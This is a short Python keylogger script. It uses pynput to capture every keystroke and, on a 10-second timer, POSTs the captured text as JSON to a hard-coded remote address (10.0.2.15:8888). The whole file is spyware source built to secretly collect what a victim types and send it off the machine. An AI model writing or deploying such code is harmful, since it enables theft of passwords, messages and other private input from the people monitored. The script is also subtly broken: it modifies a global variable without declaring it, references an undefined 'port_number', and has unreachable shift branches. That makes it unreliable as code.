from pynput import keyboard
import requests
import json
import threading


text = ""

ip_address = "10.0.2.15"
port = 8888

time_interval = 10


def key_press(key):
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.shift and len(text) == 0:
        pass
    elif key == keyboard.Key.shift and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return
    else:
        text += str(key).strip("'")

def send_post_req():
    try:
        payload = json.dumps({"keyboardData" : text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

with keyboard.Listener(on_press=key_press) as listener:
    send_post_req()
    listener.join()
